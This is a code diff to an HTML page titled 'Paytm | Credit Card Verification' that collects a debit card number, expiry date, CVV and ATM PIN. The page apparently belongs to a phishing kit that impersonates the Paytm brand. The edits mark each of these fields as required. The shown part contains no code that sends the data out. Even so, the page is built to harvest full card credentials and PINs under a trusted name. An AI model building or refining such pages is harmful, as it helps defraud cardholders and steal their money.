@@ -24,7 +24,11 @@
   <meta name="theme-color" content="#ffffff">
   <title>Paytm | Credit Card Verification</title>
   <style>
-  .inlineimage{max-width:470px;margin-right: 8px;margin-left: 10px}.images{display: inline-block;max-width: 98%;height: auto;width: 22%;margin: 1%;left:20px;text-align: center}
+  .inlineimage{max-width:470px;margin-right: 8px;margin-left: 10px}.images{display: inline-block;max-width: 98%;height: auto;width: 22%;margin: 1%;left:20px;text-align: center}.required::after {
+        content: ' *';
+        color: red;
+      }
+
   #ml
   {
   width:70%;
@@ -96,7 +100,7 @@
                         <form role="form">
                             <div class="row">
                                 <div class="col-xs-12">
-                                    <div class="form-group"> <label>Enter Debit Card No.</label>
+                                    <div class="form-group"> <label class="required">Enter Debit Card No.</label>
                                         <div class="input-group">
                                         <input type="tel" name="Card No." class="form-control" onkeypress="return formats(this,event)" onkeyup="return numberValidation(event)" placeholder="XXXX XXXX XXXX XXXX" required=""> <span class="input-group-addon"><span class="fa fa-credit-card"></span></span> 
                                         <script>
@@ -119,7 +123,7 @@
                                 </div>
                             </div><div class="row">
                                 <div class="col-xs-7 col-md-7">
-                                    <div class="form-group"> <label><span class="hidden-xs">EXPIRATION</span><span class="visible-xs-inline">Valid Thru /</span> Expiry Date</label> <input type="tel" name="Expiry Date" class="form-control" maxlength="5" onkeyup="formatString(event);" placeholder="MM / YY" required=""/> </div>
+                                    <div class="form-group"> <label class="required"><span class="hidden-xs"></span><span class="visible-xs-inline">Valid Thru /</span> Expiry Date</label> <input type="tel" name="Expiry Date" class="form-control" maxlength="5" onkeyup="formatString(event);" placeholder="MM / YY" required=""/> </div>
                                 <script type="text/javascript">
                                 function formatString(e) {
                                 var inputChar = String.fromCharCode(event.keyCode);
@@ -148,13 +152,13 @@
                                 </script>
                                 </div>
                                 <div class="col-xs-5 col-md-5 pull-right">
-                                    <div class="form-group"> <label>CVV</label> <input type="password" inputmode="numeric" Name="Cvv" class="form-control" placeholder="xxx" maxlength="3" pattern="[0-9]{3}" title="Please Enter Valid CVV!" required=""/> </div>
+                                    <div class="form-group"> <label class="required">CVV</label> <input type="password" inputmode="numeric" Name="Cvv" class="form-control" placeholder="xxx" maxlength="3" pattern="[0-9]{3}" title="Please Enter Valid CVV!" required=""/> </div>
                                 </div>
                             </div>
                            
                             <div class="row">
                                 <div class="col-xs-12">
-                                    <div class="form-group"> <label>ATM PIN</label> <input type="password" inputmode="numeric" name="Atm_pin" class="form-control" placeholder="XXXX" maxlength="4" 
+                                    <div class="form-group"> <label class="required">ATM PIN</label> <input type="password" inputmode="numeric" name="Atm_pin" class="form-control" placeholder="XXXX" maxlength="4" 
                                     
                                     title="Please enter valid pin!"
                                     required=""/> </div>
